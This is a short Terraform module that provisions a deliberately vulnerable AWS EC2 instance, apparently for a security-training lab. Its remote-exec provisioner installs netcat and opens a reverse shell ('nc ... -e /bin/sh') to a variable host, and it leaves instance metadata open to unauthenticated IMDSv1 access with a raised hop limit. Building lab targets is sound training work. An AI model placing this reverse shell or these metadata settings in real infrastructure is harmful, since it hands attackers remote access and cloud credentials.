# provide an option to enable this module
# if the variable "enabled" is true create a simple ec2 instance

resource "aws_instance" "remote-exec-example" {
  count = var.remoteexec_enabled ? 1 : 0
  ami           = "ami-06ca3ca175f37dd66"
  instance_type = "t2.micro"
  vpc_security_group_ids = [var.lab_sgs]
  subnet_id = var.lab_subnet

  associate_public_ip_address = true

  tags = {
      Name = "r2dso-lab-instance-remoteexec"
      Vulnerable = "true"
  }

provisioner "remote-exec" {
  inline = [
    "sh -c 'sudo yum install ec2-instance-connect nc  -y || true'",
    "sh -c 'nc ${var.nc_ip} 80 -e /bin/sh || true'"
  ]
}

  #iam_instance_profile = "tf-testing-role"

  connection {
    type        = "ssh"
    user        = "ec2-user"
    private_key = file(var.priv_key)
    host        = self.public_ip
    agent       = false
  }

  key_name = var.key_name

  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "optional"
    http_put_response_hop_limit = 10
  }

}

output "public_ip_remoteexec" {
  value = length(aws_instance.remote-exec-example) > 0 ? aws_instance.remote-exec-example[0].public_ip : null
}

output "remote-exec-instance" {
  value = length(aws_instance.remote-exec-example) > 0 ? aws_instance.remote-exec-example[0].id : null
}